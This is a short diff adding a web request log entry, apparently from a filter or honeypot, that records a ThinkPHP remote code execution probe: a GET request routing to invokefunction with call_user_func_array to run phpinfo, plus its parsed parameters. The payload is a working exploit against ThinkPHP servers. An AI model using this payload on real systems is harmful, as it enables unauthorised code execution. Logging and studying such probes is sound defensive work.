@@ -1,0 +1,3 @@
+data_filter|20200505154840|150.136.192.92|155.138.161.28/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1||
+|GET
+{"s":"index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["phpinfo",["1"]]}
